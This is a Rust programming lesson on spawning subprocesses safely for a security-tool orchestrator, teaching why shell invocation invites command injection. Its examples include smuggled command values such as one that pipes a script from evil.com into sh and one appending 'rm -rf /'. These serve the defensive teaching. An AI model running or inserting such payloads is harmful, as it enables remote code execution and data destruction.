# Phase 1, Day 3 — Subprocess Runner: The Atomic Unit of Achilles

> **Time budget:** 4–6 hours of focused work.
> **Prerequisite:** Day 2 complete. You understand `Result<T, E>`, the `?` operator, `match`, `.map_err()`, `HashMap`, serde, `String` vs `&str`, borrowing.
> **Outcome:** You can spawn external processes from Rust, capture their output, check exit codes, and understand why Achilles will NEVER use a shell to run tools.

> [!IMPORTANT]
> Every tool node in Achilles does exactly this: **run a command, capture its output, check for failure.**
> This is the most security-critical code you will write. A single mistake here — passing arguments through a shell — turns your orchestration engine into a remote 
> code execution vector.
> No Rustlings today. You write real systems code from scratch.

---

## Why This Day Matters

Every security tool Achilles orchestrates — `nmap`, `subfinder`, `httpx`, `nuclei`, `ffuf`, `sqlmap` — is an external binary. Achilles doesn't reimplement their scanning
logic. It **spawns them as child processes**, feeds them arguments, captures their output, and pipes that output to the next node in the DAG.

The subprocess runner is the foundation of the entire executor layer. If this is broken:
- Shell injection lets attackers execute arbitrary commands through crafted workflow inputs.
- Unclosed stdin pipes cause tools to hang forever, stalling the entire DAG.
- Uncaptured stderr means silent failures — a tool crashes but Achilles thinks it succeeded.
- Missing exit code checks mean Achilles treats garbage output as valid scan data.

In C, you'd use `fork()` + `execvp()`. In Python, you'd use `subprocess.run()`. In Rust, you use `std::process::Command` — which wraps `execvp` directly, with no
shell involvement by default.

---

## Part 1: `std::process::Command` — How It Works

### The Basic Pattern

```
Your Rust program (parent process)
    │
    ├── Command::new("nmap")      ← which binary to run
    │       .arg("-sV")           ← first argument
    │       .arg("-p")            ← second argument
    │       .arg("80,443")        ← third argument
    │       .arg("10.10.10.100")  ← fourth argument
    │       .output()             ← spawn, wait, collect output
    │
    ▼
OS kernel calls execvp("nmap", ["nmap", "-sV", "-p", "80,443", "10.10.10.100"])
    │
    ▼
nmap runs as a child process
    │
    ├── stdout → captured as Vec<u8>
    ├── stderr → captured as Vec<u8>
    └── exit code → captured as i32
```

### The `Output` Struct

When you call `.output()`, Rust spawns the child process, waits for it to finish, and returns everything in one struct:

```rust
use std::process::{Command, Output};

let output: Output = Command::new("echo")
    .arg("hello")
    .output()
    .expect("failed to run echo");

// Output has three fields:
output.status      // ExitStatus — did the command succeed?
output.stdout      // Vec<u8> — raw bytes from stdout
output.stderr      // Vec<u8> — raw bytes from stderr
```

### Converting `Vec<u8>` to `String`

stdout and stderr are raw bytes, not strings. To convert:

```rust
let stdout_text = String::from_utf8_lossy(&output.stdout);
// Returns a Cow<str> — behaves like &str for most purposes
// "lossy" replaces invalid UTF-8 bytes with � instead of crashing
```

Or if you want to fail on invalid UTF-8:

```rust
let stdout_text = String::from_utf8(output.stdout)
    .map_err(|e| format!("stdout was not valid UTF-8: {}", e))?;
```

### Checking the Exit Code

```rust
output.status.success()     // true if exit code == 0
output.status.code()        // Option<i32> — None if killed by signal
```

Unix convention: exit code 0 = success, anything else = failure. Every security tool follows this. `nmap` returns 0 on success. `nuclei` returns non-zero if it crashes mid-scan.

```
┌─────────────┬────────────────────────────────────┐
│ Exit Code   │ Meaning                            │
├─────────────┼────────────────────────────────────┤
│ 0           │ Success                            │
│ 1           │ General error                      │
│ 2           │ Misuse of command (bad args)        │
│ 126         │ Permission denied (can't execute)   │
│ 127         │ Command not found                  │
│ 128 + N     │ Killed by signal N (e.g. 137 = SIGKILL) │
│ None        │ Process killed by signal (no code)  │
└─────────────┴────────────────────────────────────┘
```

---

## Part 2: Shell Injection — The #1 Rule of Achilles

> [!CAUTION]
> **ACHILLES RULE: No shell. Ever. No exceptions.**
> Every argument to every subprocess is passed via `.arg()` — never concatenated into a shell command string.

### The Attack

Consider a workflow where the user specifies a target. A naive implementation:
```rust
//️ CATASTROPHICALLY WRONG — NEVER DO THIS
let target = user_input; // e.g., "10.0.0.1; curl evil.com/backdoor.sh | sh"

Command::new("sh")
    .arg("-c")
    .arg(format!("nmap -sV {}", target))
    .output()
```

The shell parses the string. The `;` terminates the nmap command. Everything after it executes as a separate command. The attacker's payload runs with the privileges
of the Achilles process.

### The Defense

```rust
// ✅ CORRECT — Achilles pattern
let target = user_input; // "10.0.0.1; curl evil.com/backdoor.sh | sh"

Command::new("nmap")
    .arg("-sV")
    .arg(target)  // passed directly to execvp — NO shell interpretation
    .output()
```

`What happens: `execvp` passes the string `"10.0.0.1; curl evil.com/backdoor.sh | sh"` **literally** as nmap's target argument. nmap tries to resolve that
as a hostname, fails DNS lookup, and exits with an error. No code execution. The shell metacharacters `;`, `|`, `$` are just regular characters.

### Why This Matters in Memory

```
Shell mode:     "nmap -sV 10.0.0.1; rm -rf /"
                       │
                  sh parses → splits on ; → runs TWO commands
                       │
                nmap -sV 10.0.0.1    AND    rm -rf /

Direct mode:    execvp("nmap", ["-sV", "10.0.0.1; rm -rf /"])
                       │
                  OS hands the LITERAL string to nmap
                       │
                nmap sees ONE argument: "10.0.0.1; rm -rf /"
                nmap says: "that's not a valid host" → exits
```

### The Achilles Subprocess API Shape

Every subprocess call in Achilles follows this exact pattern:

```rust
fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>
```

No `command_line: &str` parameter. No `shell: bool` flag. The API makes it **structurally impossible** to pass a shell command string. This is security
by design — the dangerous pattern can't even be expressed.

---

## Part 3: The Stdio Policy — Why `Stdio::null()` Is Mandatory

> [!WARNING]
> **Every `Command` in Achilles must set `.stdin(Stdio::null())`.**
> Without it, security tools that optionally read from stdin will hang forever, waiting for input that never arrives.

### The Problem

```rust
// Missing stdin policy — dangerous
Command::new("nuclei")
    .arg("-u").arg("https://target.com")
    .output()   // nuclei checks: "is stdin a pipe? yes → wait for URLs from stdin"
                // blocks forever — your entire Achilles DAG stalls
```

### The Fix

```rust
use std::process::Stdio;

Command::new("nuclei")
    .arg("-u").arg("https://target.com")
    .stdin(Stdio::null())       // stdin is /dev/null — EOF immediately
    .stdout(Stdio::piped())     // capture stdout
    .stderr(Stdio::piped())     // capture stderr
    .output()
```

`Stdio::null()` connects stdin to `/dev/null`. The tool immediately receives EOF when it tries to read. No blocking.

### The Three Stdio Options

```
┌─────────────────┬──────────────────────────────────────────┐
│ Stdio Option    │ What It Does                             │
├─────────────────┼──────────────────────────────────────────┤
│ Stdio::null()   │ Connected to /dev/null — reads get EOF,  │
│                 │ writes are discarded.                    │
├─────────────────┼──────────────────────────────────────────┤
│ Stdio::piped()  │ Creates a pipe — your Rust code can      │
│                 │ read from or write to the stream.        │
├─────────────────┼──────────────────────────────────────────┤
│ Stdio::inherit()│ Shares the parent's stream — child       │
│                 │ prints directly to your terminal.        │
└─────────────────┴──────────────────────────────────────────┘
```

For Achilles:
- **stdin** → always `Stdio::null()` (tools must not wait for input)
- **stdout** → always `Stdio::piped()` (we need to parse the output)
- **stderr** → always `Stdio::piped()` (we need error messages for debugging)

---

## Part 4: `.output()` vs `.spawn()` — Two Ways to Run a Process

### `.output()` — Run and Wait (Synchronous)

```rust
let output = Command::new("echo")
    .arg("hello")
    .output()?;     // blocks until process finishes
                    // returns Output { status, stdout, stderr }
```

Spawns the process, **waits** for it to finish, collects all output at once. Simple. This is what you'll use today.

### `.spawn()` — Start and Get a Handle (For Async / Streaming)

```rust
let child: Child = Command::new("nmap")
    .arg("-sV").arg(target)
    .stdin(Stdio::null())
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?;      // returns immediately — process is running in background

// Later:
let output = child.wait_with_output()?;  // NOW wait for it to finish
```

`.spawn()` gives you a `Child` handle. The process runs independently. You can:
- Wait for it later with `.wait()` or `.wait_with_output()`
- Kill it with `.kill()`
- Read its stdout/stderr as streams

You'll use `.spawn()` in Day 4 (for timeouts — you need to kill the child if it runs too long) and Day 10 (for async with `tokio::process::Command`).

---

## Part 5: `String::from_utf8_lossy` vs `String::from_utf8`

Security tool output is **almost always** valid UTF-8 — but not guaranteed. A binary might dump raw bytes in its output (e.g., hexdump sections, binary protocol data).

```
┌────────────────────────┬─────────────────────────────────────────┐
│ Method                 │ Behavior on Invalid UTF-8               │
├────────────────────────┼─────────────────────────────────────────┤
│ String::from_utf8()    │ Returns Err — you handle the failure    │
│                        │ Returns owned String on success         │
├────────────────────────┼─────────────────────────────────────────┤
│ String::from_utf8_lossy│ Replaces bad bytes with '�' (U+FFFD)   │
│                        │ Never fails — always returns valid text │
│                        │ Returns Cow<str>, not String            │
└────────────────────────┴─────────────────────────────────────────┘
```

For Achilles, the approach depends on context:
- **Human-readable output** (logs, error messages): use `from_utf8_lossy` — don't crash on weird bytes
- **Machine-parsed output** (XML, JSON): use `from_utf8` and propagate the error — invalid UTF-8 means corrupted data

---

## Part 6: Understanding `Cow<str>`

`String::from_utf8_lossy()` returns `Cow<'_, str>`, not `String`. You'll see this type.

`Cow` stands for **Clone-on-Write**. It's an enum:

```rust
enum Cow<'a, B> {
    Borrowed(&'a B),   // just a reference — no allocation
    Owned(B::Owned),   // owned data — allocated
}
```

For `Cow<str>`:
- If the bytes are **all valid UTF-8**: returns `Borrowed(&str)` — zero-cost, just points to the original bytes
- If there are **invalid bytes**: allocates a new `String` with replacements → returns `Owned(String)`

You can use `Cow<str>` anywhere you'd use `&str`. If you need a `String`, call `.to_string()` or `.into_owned()`.

For now, just know: **`from_utf8_lossy` gives you something that works like a string.** You can print it, format it, pass it to functions expecting `&str`. Don't overthink it.

---

## Part 7: Exercises

> [!IMPORTANT]
> **These exercises are task-based.** I describe what to build and what the output should look like. **You write the code yourself.** If you're stuck, ask — I'll hint, not solve.

### Exercise 1 — Run a simple command and capture output

Create `~/Antigravity/Achilles/src/bin/day3_basic_command.rs`.

**Task:** Write a program that:

1. Runs `echo "Achilles subprocess test"` using `Command::new("echo")` with `.arg()`.
2. Captures stdout and stderr.
3. Prints whether the command succeeded (exit code 0).
4. Prints the stdout as a string.
5. Prints the stderr (it should be empty for `echo`).

**Expected output:**
```
=== Basic Command Execution ===

Command succeeded: true
Exit code: 0
stdout: Achilles subprocess test

stderr: (empty)
```

**Hints:**
- `use std::process::Command;`
- `.output()` returns `Result<Output, io::Error>` — use `.expect()` or `?`
- `String::from_utf8_lossy(&output.stdout)` to convert bytes to text
- `output.status.success()` returns `bool`
- `output.status.code()` returns `Option<i32>`

**Run:** `cargo run --bin day3_basic_command`

---

### Exercise 2 — Handle command failure

Create `~/Antigravity/Achilles/src/bin/day3_error_handling.rs`.

**Task:** Write a program that:

1. Runs a command that **will succeed**: `ls /tmp`
2. Runs a command that **will fail**: `ls /nonexistent_directory_xyz`
3. Runs a command that **doesn't exist**: tries to run a binary called `this_binary_does_not_exist_12345`
4. For each, print the exit code and whether it succeeded.
5. For the failing cases, print stderr.
6. For the nonexistent binary, handle the `io::Error` from `.output()` — this is different from a command that runs but exits non-zero.

**Expected output pattern:**
```
=== Command Success ===
Exit code: 0
Success: true

=== Command Failure (non-zero exit) ===
Exit code: 2
Success: false
stderr: ls: cannot access '/nonexistent_directory_xyz': No such file or directory

=== Command Not Found ===
Error: No such file or directory (os error 2)
```

**Key insight to understand:** There are **two different error types**:
- **The binary runs but exits non-zero** → `.output()` returns `Ok(output)`, but `output.status.success()` is `false`. The binary was found and executed — it just reported failure.
- **The binary doesn't exist** → `.output()` returns `Err(io::Error)`. The OS couldn't even find the binary to run it.

This distinction matters in Achilles: "nmap returned an error" vs "nmap is not installed" are completely different situations that need different handling.

**Run:** `cargo run --bin day3_error_handling`

---

### Exercise 3 — The Achilles subprocess runner function

Create `~/Antigravity/Achilles/src/bin/day3_runner.rs`.

**Task:** Write a reusable function with this exact signature:

```rust
fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>
```

Where:

```rust
#[derive(Debug)]
struct ToolOutput {
    stdout: String,
    stderr: String,
    exit_code: i32,
}

#[derive(Debug)]
enum ToolError {
    NotFound(String),       // binary doesn't exist
    ExecutionFailed(String), // other OS error (permissions, etc.)
    NonZeroExit {           // binary ran but returned non-zero
        exit_code: i32,
        stderr: String,
    },
}
```

**Requirements for `run_tool`:**
1. Use `Command::new(binary)` with `.args(args)` — NO shell.
2. Set `stdin(Stdio::null())`, `stdout(Stdio::piped())`, `stderr(Stdio::piped())`.
3. If `.output()` returns `Err`:
   - Check `err.kind()` — if it's `io::ErrorKind::NotFound`, return `ToolError::NotFound`.
   - Otherwise, return `ToolError::ExecutionFailed`.
4. If the exit code is non-zero, return `ToolError::NonZeroExit` with the code and stderr.
5. If the exit code is 0, return `Ok(ToolOutput)` with stdout, stderr, and exit code.
6. Use `String::from_utf8_lossy` for converting stdout/stderr.

**In `main()`, test your function with:**

```
PART A: run_tool("echo", &["hello", "from", "achilles"])
        → should succeed, print the stdout

PART B: run_tool("ls", &["/nonexistent_path_xyz"])
        → should return NonZeroExit, print the error

PART C: run_tool("fake_binary_xyz", &["--version"])
        → should return NotFound, print the error

PART D: run_tool("cat", &["/etc/hostname"])
        → should succeed, print your machine's hostname
```

**Expected output pattern:**
```
=== Achilles Subprocess Runner ===

--- PART A: echo ---
✅ Success (exit 0)
stdout: hello from achilles

--- PART B: ls nonexistent ---
❌ NonZeroExit (exit 2)
stderr: ls: cannot access '/nonexistent_path_xyz': No such file or directory

--- PART C: binary not found ---
❌ NotFound: fake_binary_xyz

--- PART D: cat hostname ---
✅ Success (exit 0)
stdout: <your hostname>
```

**Run:** `cargo run --bin day3_runner`

---

### Exercise 4 — Shell injection proof

Create `~/Antigravity/Achilles/src/bin/day3_injection_proof.rs`.

**Task:** Prove that Achilles's subprocess model is immune to shell injection.

1. Define a malicious target string: `"127.0.0.1; echo HACKED"`
2. Run it through your `run_tool` function (copy it from Exercise 3):
   - `run_tool("echo", &[&malicious_target])`
3. Print the stdout.
4. The output should contain the **literal string** `"127.0.0.1; echo HACKED"` — NOT the word `HACKED` on a separate line.
5. Now run it through a shell command (the WRONG way) to see the difference:
   - `run_tool("sh", &["-c", &format!("echo {}", malicious_target)])`
6. Print the stdout from the shell version. Observe that the shell **did** interpret the `;` — the output contains `HACKED` on a separate line.
7. Print a clear message explaining why the direct approach is safe and the shell approach is dangerous.

**Expected output pattern:**
```
=== Shell Injection Proof ===

--- Direct (safe) ---
stdout: 127.0.0.1; echo HACKED
✅ Metacharacters are literal text — no injection

--- Shell (dangerous) ---
stdout: 127.0.0.1
HACKED
Shell interpreted ';' — attacker payload executed!

--- Conclusion ---
Achilles uses direct execvp. Shell metacharacters are never interpreted.
```

**Run:** `cargo run --bin day3_injection_proof`

> [!NOTE]
> After writing this exercise, you'll understand viscerally why every subprocess call in Achilles uses `(binary, args)` and never a shell string. 
> This isn't theoretical — you'll see the injection happen live.

---

### Exercise 5 — Run a real tool (if installed)

Create `~/Antigravity/Achilles/src/bin/day3_real_tool.rs`.

**Task:** Use your `run_tool` function to run actual tools (if they're installed on your system). Handle the case where they're not installed gracefully.

1. Try: `run_tool("uname", &["-a"])` — should work on any Linux system.
2. Try: `run_tool("whoami", &[])` — prints current user.
3. Try: `run_tool("nmap", &["--version"])` — prints nmap version if installed.
4. Try: `run_tool("id", &[])` — prints user ID, group ID, etc.
5. For each tool, use `match` on the `Result`:
   - `Ok(output)` → print stdout
   - `Err(ToolError::NotFound(_))` → print "not installed"
   - `Err(other)` → print the error

**Expected output pattern:**
```
=== Real Tool Execution ===

--- uname -a ---
✅ Linux phantom-arch 6.x.x ...

--- whoami ---
✅ phantom

--- nmap --version ---
✅ Nmap version 7.95 ( https://nmap.org )
   (or: ❌ nmap not installed)

--- id ---
✅ uid=1000(phantom) gid=1000(phantom) groups=...
```

**Run:** `cargo run --bin day3_real_tool`

---

## Part 8: Key Concepts to Internalize

**1. What does `Command::new("nmap").arg(target).output()` call at the OS level?**
`execvp("nmap", ["nmap", target])` — direct syscall, no shell.

**2. `.output()` returning `Err` vs `Ok` with non-zero exit?**
`Err` = binary not found or OS error.
`Ok` with non-zero = binary ran but reported failure.

**3. Why must Achilles always set `.stdin(Stdio::null())`?**
Tools like `nuclei`/`ffuf` read from stdin if it's open.
Without `null()`, they block forever waiting for input.

**4. What does `Stdio::piped()` do?**
Creates a pipe between parent and child.
Parent can read child's stdout/stderr as bytes.

**5. Why does `String::from_utf8_lossy` return `Cow<str>`?**
If bytes are valid UTF-8, it returns a borrowed reference (zero-cost).
Only allocates a new String if invalid bytes need replacement.

**6. What is shell injection and how does Achilles prevent it?**
Attacker embeds shell metacharacters (`;`, `|`, `` ` ``) in input.
Achilles prevents it by never invoking a shell —
`execvp` treats all arguments as literal strings.

**7. What's the Achilles subprocess runner API signature?**
`fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>`
No shell parameter. No command string. Each argument is separate.

**8. What does `output.status.code()` return? When is it `None`?**
Returns `Option<i32>`.
`None` when the process was killed by a signal (e.g., SIGKILL)
rather than exiting normally.

**9. `Stdio::null()` vs `Stdio::piped()` vs `Stdio::inherit()`?**
`null` = /dev/null (discard).
`piped` = create pipe for capture.
`inherit` = share parent's terminal stream.

**10. Why `args: &[&str]` instead of `command_line: &str`?**
Structural prevention of shell injection.
The API can't express a shell command —
each argument is always separate.

---

## Completion Checklist

- [X] Read and understand Parts 1–6 (Command, shell injection, Stdio, output vs spawn, UTF-8, Cow)
- [X] Exercise 1 — Basic command execution (`day3_basic_command.rs`)
- [X] Exercise 2 — Error handling: success, failure, not found (`day3_error_handling.rs`)
- [X] Exercise 3 — `run_tool` function with `ToolOutput`/`ToolError` types (`day3_runner.rs`)
- [X] Exercise 4 — Shell injection proof: direct vs shell (`day3_injection_proof.rs`)
- [X] Exercise 5 — Run real tools: `uname`, `whoami`, `nmap`, `id` (`day3_real_tool.rs`)
- [X] Can explain why `Command::new` is safe and `sh -c` is dangerous
- [X] Can explain the difference between `.output()` `Err` and non-zero exit code
- [X] Can explain why `Stdio::null()` is mandatory for stdin

---

## Lesson

> The subprocess runner is a **trust boundary**. Everything inside your Rust process is memory-safe, type-checked, borrow-checked. The moment you `Command::new()`, 
> you're handing control to an external binary that can do anything — read files, open sockets, delete data. Your job is to **constrain** that boundary: 
> no shell interpretation, no stdin leaks, no unchecked exit codes, no silently swallowed errors.
>
> Every Achilles tool node is just this pattern: spawn → capture → check → parse. Master it today.

---

**Next: Day 4 — Timeouts, Signals, and Failure Modes →**
